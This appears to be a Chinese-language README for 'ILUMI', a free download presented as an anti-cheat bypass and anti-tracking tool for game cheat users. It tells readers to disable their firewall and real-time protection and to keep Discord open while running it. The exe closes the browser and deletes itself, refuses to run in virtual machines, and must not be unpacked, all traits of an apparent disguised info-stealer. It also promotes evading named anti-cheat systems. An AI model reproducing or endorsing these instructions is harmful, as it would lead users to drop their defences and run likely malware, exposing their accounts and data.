# -------------------------------------------
# **✨ILUMI防封防檢測說明(中文繁體版)**
# -------------------------------------------
## 唯一正版載點: [點我下載](https://mega.nz/folder/V6sihCSI#qQIorSwaNChoEObIYdP-RA)


• 癱瘓支持的防作弊，使用防作弊的遊戲將不會回傳妳任何怪怪的遊戲數據。
• 啟用後Discord&瀏覽器將不可以對你進行追蹤或記錄，為了使防偵測最佳化會直接強制鎖定匿名和私密的狀態。
• 沒有使用外掛,插件,輔助，也可以當作防追蹤的防護軟體使用，禁止所有第三方(釣魚網,黑客,詐騙網址,防作弊等)的回傳任務。(你一樣可以上傳和正常使用)。


## 🔓➤開啟步驟
## ==============================

Step 1: 打開瀏覽器(做確認用的)。
Step 2: 打開"ILUMIα.exe"。
Step 3: 瀏覽器自動關閉,"ILUMIα.exe"自動刪除，開啟成功


## 📌➤ILUMI注意事項
## ==============================

A: 怎麼關閉防追蹤?
B: 重開機就好。

1. 確定"防火牆"和"及時保護"都關閉了。(一直失敗才需要)
2. 運行前請開著Discord並且不要使用Discrd直播功能。
3. 無法在虛擬機中進行運作，會直接錯誤並失效得重開機再次開啟ILUMI。
4. 運行前請勿開啟任何VPN，如果在國內的寶貝請用固定的加速器和節點。
5. 運行後如果出現 Error 500 意思是妳的網路環境不好換個網路再試試看。
6. 運行後如果出現 Error 808 意思是妳的網路環境狗幹爛，雲端更新失敗重開機在試。 
7. 防封一定是在開啟外掛或插件或輔助前才開啟，如果有外掛或插件或輔助是要你進遊戲再開啟的那也一樣是注入輔助前開防封。
8. 瀏覽器關閉也是正常的，因為要加密雲端傳輸不讓遊戲或者插件抓取IP所以ILUMI會在加載前暫時禁用瀏覽器，"ILUMIα.exe"自動刪除後就可以正常使用了。


## 🤝➤目前ILUMI支持的開發團隊
## =========================

• Fecurity 

• NeverLose

• RTX-BGX

• KernAim

• Unnamed

• Ring

• Skeet

• UK


## 🏹➤目前ILUMI只支持以下幾個反作弊
## =======================

• Valve Anti-Cheat (VAC) System

• PunkBuster

• Easy Anti-Cheat (EAC)

• BattlEye

• FairFight

• GameGuard

• HackShield

• XIGNCODE3

• nProtect GameGuard

• Warden Client

• Riot Vanguard(只有特戰英豪)


## 🛐➤作者的發言
## =======================
**希望各位能喜歡我開發的軟體，雖然不收費但確實有伺服器的成本，所以也請各位不要外傳或者是轉售不然我抓到將會取消之後的所有福利向的軟件給各位。
也請不要拆包後重製並轉售，這是我的智慧財產也是我的心血，後續我將陸續給各位發行更多更牛逼的軟件，都是我一手創造且目前市面上沒有的秘密好東西。**

➤更新日誌
=======================
修正部分Discord插件衝突，並且不會再次重啟您的dc，檔案核心也會被刪除，如果需要再次啟用就去雲端下載。
